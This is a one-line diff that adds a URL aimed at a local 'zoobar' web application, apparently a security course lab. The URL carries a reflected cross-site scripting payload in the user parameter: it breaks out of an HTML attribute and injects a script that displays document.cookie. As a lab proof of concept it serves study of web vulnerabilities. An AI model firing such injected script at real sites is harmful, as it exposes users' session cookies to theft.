@@ -1,0 +1,1 @@
+https://localhost:8080/zoobar/index.cgi/users?user=<test"><script>alert(document.cookie)</script>
